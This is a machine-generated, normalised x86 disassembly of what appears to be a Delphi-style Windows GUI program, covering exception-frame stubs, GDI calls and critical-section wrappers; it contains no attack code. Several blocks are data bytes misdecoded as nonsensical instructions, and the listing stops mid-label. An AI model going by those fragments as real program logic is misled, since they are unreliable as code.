pop ebp
retn
sub_4689be
jmp sub_448b58
sub_4689c5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_4481b0
retn
sub_4689db
jmp sub_448b58
sub_468afa
jmp sub_448b58
sub_468b01
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468b1e
mov eax [ ebp - 0x14 ]
call sub_4481b0
retn
sub_468b17
jmp sub_448b58
sub_468b3c
jmp sub_448b58
sub_468bc6
jmp sub_448b58
sub_468bcd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_468bfc
push ebx
mov ebx eax
mov eax ebx
call sub_4248a0
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_42f4b4
sub_468cc4
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_468cd8
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x50 ]
retn
sub_468ce0
mov eax [ eax + 0x34 ]
mov [ eax + 0x50 ] edx
retn
sub_4691bb
jmp sub_448b58
sub_4691c2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4692b5
jmp sub_448b58
sub_4692bc
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_469403
retn
sub_469404
jmp sub_448b58
j_sub_469403
jmp sub_469403
sub_46940b
pop ebp
retn
sub_46a374
sbb al 0xeb
inc edx
add [ ebx + ecx * 8 ] ch
dec eax
add [ edx + esi * 4 ] ah
inc esi
add ah ah

sub_46a3da
dec eax
add [ esp + edx + 0x14a80045 ] ah
inc ebp
add ah al

sub_46a3e6
dec eax
add [ edx + ecx * 8 ] ah
dec eax
add [ edx + ecx * 8 + 0x48 ] ch
add [ eax - 0x4bffb736 ] bh
enter 0x48 0x74

sub_46a4ab
jmp sub_448b58
sub_46a4b8
mov edx [ eax + 0xc ]
test edx edx
je r-xdata
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_46a534
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebx + 0x10 ]
mov edx esi
call sub_449d2c
mov eax ebx
call sub_46a4b8
pop esi
pop ebx
retn
sub_46a550
mov [ eax + 0x14 ] edx
call sub_46a4b8
retn
sub_46a55c
mov [ eax + 0x18 ] edx
call sub_46a4b8
retn
sub_46a594
push ebx
mov ebx eax
mov eax ebx
call sub_425354
mov [ eax + 0xc ] ebx
pop ebx
retn
sub_46a74e
jmp sub_448b58
sub_46a755
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a760
call sub_4257d8
retn
sub_46a86c
cmp dl [ eax + 0x1d ]
je r-xdata
retn
mov [ eax + 0x1d ] dl
test dl dl
je r-xdata
mov edx sub_46a568
call sub_46a5a4
sub_46a884
mov edx sub_46a568
call sub_46a5a4
retn
sub_46aa49
jmp sub_448b58
sub_46aa84
push ebx
mov ebx ecx
mov eax ebx
xor edx edx
call sub_449d2c
pop ebx
retn
sub_46aa94
mov al 0x1
retn
sub_46ab9d
jmp sub_448b58
sub_46ac98
retn
sub_46adbb
jmp sub_448b58
sub_46adc2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46b114
mov eax [ eax + 0xd0 ]
call sub_4254d8
retn
sub_46b184
mov eax [ r-xdata ]
retn
sub_46b1b0
push esi
mov esi eax
mov eax [ esi + 0xd0 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_46b1e4
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_448388
pop ebx
retn
sub_46b2d4
retn
sub_46b41b
jmp sub_448b58
sub_46b422
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46b42c
retn
sub_46b44f
jmp sub_448b58
sub_46b456
pop ebp
retn 0x4
sub_46b4b9
jmp sub_448b58
sub_46b4c0
pop ebp
retn
sub_46b4c4
sub [ rw-data ] 0x1
retn
sub_46c19c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
retn 0x46
sub_46c1ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
retn 0x46
sub_46c24d
xor al [ edi ]
mov al [ 0xffffffffc8004734 ]
xor al 0x47
add ah bl
xor al 0x47
add [ esp + esi + 0x47 ] ah
add [ 0x6f634954 ] al
outsb
nop
nop
insb
retn 0x46
sub_46c288
test eax eax
je r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
push eax
call DeleteObject
sub_46c29d
retn 0x46
sub_46c2b9
retn 0x46
sub_46c2bc
cld
retn 0x46
sub_46c366
inc esi
add [ ecx ] al
add bh bh
jmp [ esi + eax * 8 + 0x54150046 ]
sub_46c388
mov ecx edx
mov edx eax
xor eax eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_46c3fc
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_46c408
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_46c4e8
jmp sub_448b58
sub_46c4ef
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46c580
jmp sub_448b58
sub_46c625
jmp sub_448b58
sub_46c62c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46c634
retn
sub_46c694
jmp sub_448b58
sub_46c69b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46c6a4
cmp [ edx + 0x1d ] 0x0
je r-xdata
retn
lea eax [ edx + 0x18 ]
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
sub_46c71c
jmp sub_448b58
sub_46c723
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46c7c9
jmp sub_448b58
sub_46c7d0
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46cf34
push 0x33
mov ecx rw-data
call sub_424030
retn
sub_46cf44
push 0x33
mov ecx rw-data
call sub_423ff0
retn
sub_46cf54
push ebx
cmp [ eax + 0xa ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
sub_46cf78
mov edx [ eax + 0x14 ]
test edx edx
je r-xdata
retn
push edx
call LeaveCriticalSection
sub_46d2a4
push 0x11
mov ecx rw-data
call sub_423ff0
retn
sub_46d3b1
jmp sub_448b58
sub_46d3b8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d454
push ebx
mov ebx eax
mov eax ebx
call sub_46cf54
cmp [ ebx + 0x20 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x20 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_46d50e
jmp sub_448b58
sub_46d515
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_46cf78
retn
sub_46d52b
jmp sub_448b58
sub_46d544
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
mov ecx 0x23
[ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_46d5a1
jmp sub_448b58
sub_46d5a8
pop ebx
pop ecx
pop ebp
retn
sub_46d7aa
jmp sub_448b58
sub_46d7da
jmp sub_448b58
sub_46d7e1
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46d8b7
jmp sub_448b58
sub_46d8be
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46d920
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
push eax
push 0x48
mov eax ebx
call sub_46d830
push eax
call MulDiv
neg eax
pop ebx
retn
sub_46d9a8
mov eax [ eax + 0x10 ]
movzx eax [ eax + 0x1c ]
retn
sub_46d9e8
mov eax [ eax + 0x10 ]
movzx eax [ eax + 0x1e ]
retn
sub_46da28
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_46db6b
jmp sub_448b58
sub_46db72
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_46cf78
retn
sub_46db88
jmp sub_448b58
sub_46dbfd
jmp sub_448b58
sub_46dc04
pop ebx
pop ecx
pop ebp
retn
sub_46dc08
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_46dcc6
jmp sub_448b58
sub_46dcd8
push esi
cmp dl [ eax + 0x18 ]
je r-xdata
pop esi
retn
mov [ eax + 0x18 ] dl
mov si 0xfffd
call sub_4483f8
sub_46dcec
mov eax [ eax + 0x10 ]
movzx eax [ eax + 0x1c ]
retn
sub_46dd24
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_46de4f
jmp sub_448b58
sub_46de56
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_46cf78
retn
sub_46de6c
jmp sub_448b58
sub_46dee5
jmp sub_448b58
sub_46deec
pop ebx
pop ecx
pop ebp
retn
sub_46e03e
jmp sub_448b58
sub_46e050
mov eax [ eax + 0x10 ]
movzx eax [ eax + 0x1c ]
retn
sub_46e3b0
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x54 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x3c ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_46e5be
jmp sub_448b58
sub_46e5c5
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_46e711
jmp sub_448b58
sub_46e718
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46e7ac
jmp sub_448b58
sub_46e7b3
movzx eax [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_46e7bc
push ebx
mov ebx eax
lea eax [ ebx + 0x3c ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x54 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_46e7f4
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_46e94c
retn
sub_46ea19
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_46ea30
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_46eb1c
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_46eb3c
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_46eb5c
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_46eb7c
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
pop ebx
retn
sub_46eb94
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_439d08
call sub_448c38
pop ebx
retn
sub_46ebb8
mov eax [ rw-data ]
call sub_46eb94
retn
sub_46ec0e
jmp sub_448b58
sub_46ec15
pop ecx
pop ebp
retn
sub_46ecb4
jmp sub_448b58
sub_46ecbb
pop ebx
mov esp ebp
pop ebp
retn
sub_46ed8d
jmp sub_448b58
sub_46ee1e
jmp sub_448b58
sub_46ee25
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46ef38
jmp sub_448b58
sub_46f0e5
jmp sub_448b58
sub_46f0ec
movzx eax [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_46f305
jmp sub_448b58
sub_46f30c
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_46f3a6
jmp sub_448b58
sub_46f583
jmp sub_448b58
sub_46f63d
jmp sub_448b58
sub_46f644
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f664
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_46f65d
jmp sub_448b58
sub_46f664
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_46f7f5
jmp sub_448b58
sub_46f9c2
jmp sub_448b58
sub_46f9c9
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46f9ec
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_4474a8
retn
sub_46f9e5
jmp sub_448b58
sub_46f9ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46fa0c
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_4474a8
retn
sub_46fa05
jmp sub_448b58
sub_46fa0c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_46fb64
push 0x0
call sub_46fafc
retn
sub_46fc09
jmp sub_448b58
sub_46fc10
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_46fc20
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_46fb6c
pop ebx
pop ebp
retn 0x4
sub_46fc34
retn
sub_46fc38
test eax eax
jne r-xdata
retn
call sub_46fc34
sub_46fe0d
jmp sub_448b58
sub_46fe34
jmp sub_448b58
sub_46fe3b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46fe7c
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_470064
jmp sub_448b58
sub_47006b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4481b0
retn
sub_470081
jmp sub_448b58
sub_4700c4
xor eax eax
retn
sub_4700c8
xor eax eax
retn
sub_4700cc
movzx eax [ eax + 0x21 ]
retn
sub_47011c
jmp sub_448b58
sub_470123
pop esi
pop ecx
pop ebp
retn
sub_470154
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x5c ]
pop esi
retn
sub_4701ab
jmp sub_448b58
sub_4701b2
pop esi
pop ecx
pop ebp
retn
sub_4701b8
retn
sub_4701d8
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4701e8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x60 ]
pop esi
retn
sub_470312
jmp sub_448b58
sub_47033a
jmp sub_448b58
sub_470341
mov esp ebp
pop ebp
retn
sub_4703b8
jmp sub_448b58
sub_4704c0
jmp sub_448b58
sub_4705ab
jmp sub_448b58
sub_4705e0
inc [ eax + 0x4 ]
retn
sub_470763
jmp sub_448b58
sub_470b14
jmp sub_448b58
sub_470d5e
jmp sub_448b58
sub_470d88
jmp sub_448b58
sub_470d8f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_470db1
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_470daa
jmp sub_448b58
sub_470dbb
jmp sub_4488a4
sub_470e0a
jmp sub_448b58
sub_471037
jmp sub_448b58
sub_47107f
jmp sub_448b58
sub_471215
jmp sub_448b58
sub_4712dc
jmp sub_4488a4
sub_471338
mov [ eax + 0x31 ] 0x0
call sub_46fe7c
retn
sub_471593
jmp sub_448b58
sub_471657
jmp sub_448b58
sub_47165e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_47183f
jmp sub_448b58
j_sub_47181c
jmp sub_47181c
sub_4718fa
cmp [ ebp - 0x9 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_471913
jmp sub_448b58
j_sub_4718fa
jmp sub_4718fa
sub_47191a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_47198c
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_471a40
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_471a50
push ebx
mov ebx eax
mov eax ebx
call sub_471dcc
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_471a64
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_471a80
push ebx
mov ebx eax
mov eax ebx
call sub_471e2c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_471b18
mov edx [ eax + 0x28 ]
cmp [ edx + 0x3e ] 0x20
jne r-xdata
xor eax eax
retn
movzx eax [ eax + 0x39 ]
dec eax
sub al 0x2
jb r-xdata
mov al 0x1
retn
sub_471ca0
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_471daf
jmp sub_448b58
sub_472014
jmp sub_4488a4
sub_472074
jmp sub_448b58
sub_47207b
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_472461
jmp sub_448b58
sub_47248d
jmp sub_448b58
sub_4724f4
jmp sub_4488a4
sub_472525
jmp sub_448b58
sub_4725aa
jmp sub_4488a4
sub_4725af
mov eax [ ebp - 0x38 ]
call sub_4481b0
call sub_448ca8
call sub_448cfc
sub_4725c1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4725de
mov eax [ ebp - 0x18 ]
call sub_4474a8
retn
sub_4725d7
jmp sub_448b58
sub_47274f
jmp sub_4488a4
sub_4728b4
push ebx
mov ecx [ eax + 0x28 ]
mov ecx [ ecx + 0x1c ]
xchg edx ecx
mov ebx [ eax ]
call [ ebx + 0x6c ]
pop ebx
retn
sub_4729d8
jmp sub_4488a4
sub_472b60
jmp sub_448b58
sub_472b7c
push ebx
mov ecx [ eax + 0x28 ]
mov ecx [ ecx + 0x20 ]
mov ebx [ eax ]
call [ ebx + 0x6c ]
pop ebx
retn
sub_472b8c
mov cl 0x1
call sub_472b94
retn
sub_472e61
add [ eax ] al
add [ ebx ] dh
leave
call sub_472b94
retn
sub_472ee6
jmp sub_4488a4
sub_472eeb
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_448ca8
call sub_448cfc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_472f9c
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x14 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_4730d9
add [ eax ] al
add [ ebx + 0x78832840 ] cl
adc al 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov al 0x1
retn
sub_473265
jmp sub_4488a4
sub_47331a
jmp sub_4488a4
sub_473384
jmp sub_4488a4
sub_473435
jmp sub_448b58
sub_47344c
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_46eb7c
retn
mov [ eax + 0x30 ] edx
retn
sub_473464
push ebx
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_46eb7c
pop ebx
retn
mov [ eax + 0x2c ] edx
mov [ eax + 0x30 ] ecx
pop ebx
retn
sub_473484
retn
sub_473488
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x14 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_46eb7c
retn
mov [ eax + 0x2c ] edx
retn
sub_4734c8
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_46eb7c
pop ebp
retn 0x4
sub_4734dc
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_46eb7c
pop ebp
retn 0x4
sub_473535
jmp sub_448b58
sub_47353c
mov eax rw-data
mov edx 0xf
call sub_46f208
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_473653
jmp sub_448b58
sub_473696
jmp sub_448b58
sub_47369d
mov esp ebp
pop ebp
retn
sub_473840
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_47384c
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_4738f9
jmp sub_448b58
sub_473900
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4739eb
jmp sub_4488a4
sub_473a59
jmp sub_448b58
sub_473b8d
jmp sub_448b58
sub_473b94
pop ebp
retn
sub_4767ce
inc esp
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add ah dl
hlt
sub_4769d4
mov eax [ rw-data ]
retn
sub_4769dc
mov [ rw-data ] eax
retn
sub_476bf4
jmp sub_4488a4
sub_476c32
jmp sub_448b58
sub_476c39
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_476e58
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42f338
pop ebp
retn 0x8
sub_476e6c
call sub_42f3d0
retn
sub_476e74
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42f400
pop ebp
retn 0x8
sub_476e88
call sub_42f4b4
retn
sub_476fd4
jmp sub_448b58
sub_476fdb
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4770a9
jmp sub_448b58
sub_4770b0
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_477144
movzx eax [ eax + 0x1f ]
xor al 0x1
retn
sub_47787c
cmp edx [ eax + 0x28 ]
je r-xdata
retn
mov [ eax + 0x28 ] edx
mov [ eax + 0x2c ] 0x0
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_477f20
sub_477898
cmp dl [ eax + 0x2c ]
je r-xdata
retn
mov [ eax + 0x2c ] dl
test dl dl
je r-xdata
mov edx 0xff000014
call sub_47787c
sub_4779b0
cmp dl [ eax + 0x34 ]
je r-xdata
retn
mov [ eax + 0x34 ] dl
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_477f20
sub_4779c8
cmp edx [ eax + 0x38 ]
je r-xdata
retn
mov [ eax + 0x38 ] edx
mov [ eax + 0x44 ] 0x1
mov eax [ eax + 0x4 ]
call sub_477f20
sub_4779e0
mov ecx edx
mov [ eax + 0x10 ] ecx
test ecx ecx
jge r-xdata
mov eax [ eax + 0x4 ]
call sub_477f20
retn
xor edx edx
mov [ eax + 0x10 ] edx
sub_477a0c
mov eax [ eax + 0x4 ]
movzx eax [ eax + 0x268 ]
xor al 0x1
retn
sub_477a1c
mov [ eax + 0x1c ] dl
mov eax [ eax + 0x4 ]
call sub_477f20
retn
sub_477cf8
push ebx
mov ebx edx
mov edx ebx
call sub_4926c0
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_477d68
cmp [ eax + 0x5c ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x1e4 ] 0x0
je r-xdata
mov al 0x1
retn
cmp [ eax + 0x1e3 ] 0x0
je r-xdata
sub_477e90
jmp sub_448b58
sub_477e97
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_477ea0
push ebx
mov ebx eax
cmp [ ebx + 0x26c ] 0x0
jg r-xdata
pop ebx
retn
mov eax [ ebx + 0x260 ]
call sub_4772b0
mov eax [ ebx + 0x264 ]
call sub_4772b0
sub_477f00
push esi
mov esi eax
mov eax [ esi + 0x260 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_477f10
push esi
mov esi eax
mov eax [ esi + 0x264 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_47800b
jmp sub_448b58
sub_478018
test edx edx
je r-xdata
retn
test [ edx + 0x1c ] 0x1
jne r-xdata
test [ eax + 0x1c ] 0x1
jne r-xdata
call sub_478030
sub_47824c
retn
sub_4782bc
jmp sub_448b58
sub_47830b
jmp sub_448b58
sub_478340
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_494788
retn
mov ecx [ eax + 0x260 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x260 ]
call sub_477538
retn
sub_478364
cmp [ edx + 0x8 ] 0x0
jne r-xdata
call sub_4947a8
retn
mov ecx [ eax + 0x264 ]
cmp [ ecx + 0x1c ] 0x0
je r-xdata
mov eax [ eax + 0x264 ]
call sub_477538
retn
sub_478469
jmp sub_448b58
sub_478470
mov eax [ ebp - 0x4 ]
call sub_496c14
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
call sub_47719c
mov eax [ ebp - 0x4 ]
call sub_477f20
sub_478554
cmp dl [ eax + 0x278 ]
je r-xdata
retn
mov [ eax + 0x278 ] dl
call sub_492ec4
sub_478568
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_4785a0
retn
sub_4786c9
jmp sub_448b58
sub_478701
jmp sub_448b58
sub_478708
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47872a
lea eax [ ebp - 0x18 ]
mov edx 0x2
call j_sub_44936c
retn
sub_478723
jmp sub_448b58
sub_47872a
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_478ac8
jmp sub_448b58
sub_478acf
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4486e4
sub_478b25
jmp sub_4488a4
sub_478ba1
jmp sub_4488a4
sub_478ba6
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_482674
call sub_448cfc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_478ffe
jmp sub_448b58
sub_479005
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_479118
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_429714
mov [ ebx + 0x2c4 ] eax
pop esi
pop ebx
retn
sub_479130
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4791a4
mov edx eax
mov eax esi
call sub_42bb80
pop esi
pop ebx
retn
sub_47914c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_47ad2c
mov edx eax
mov eax esi
call sub_42bb80
pop esi
pop ebx
retn
sub_4791a4
push ebx
mov ebx eax
mov eax ebx
call sub_47a888
mov edx r-xdata
call sub_46e740
pop ebx
retn
sub_4792b4
push ebx
mov ebx eax
mov eax ebx
call sub_4792c4
xor al 0x1
pop ebx
retn
sub_4792c4
cmp [ eax + 0x268 ] 0x0
jne r-xdata
mov al 0x1
retn
mov edx [ eax + 0x260 ]
cmp [ edx + 0x10 ] 0x0
jne r-xdata
mov eax [ eax + 0x264 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
xor eax eax
retn
sub_479320
push ebx
cmp [ eax + 0x2e2 ] 0x0
je r-xdata
pop ebx
retn
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2e4 ]
call [ ebx + 0x2e0 ]
sub_479340
push ebx
cmp [ eax + 0x302 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x304 ]
call [ ebx + 0x300 ]
sub_479360
push ebx
cmp [ eax + 0x31a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x31c ]
call [ ebx + 0x318 ]
sub_479474
mov edx [ eax + 0x24c ]
test edx edx
je r-xdata
xor eax eax
retn
push 0x4
push edx
call GetWindow
retn
sub_479677
jmp sub_448b58
sub_47967e
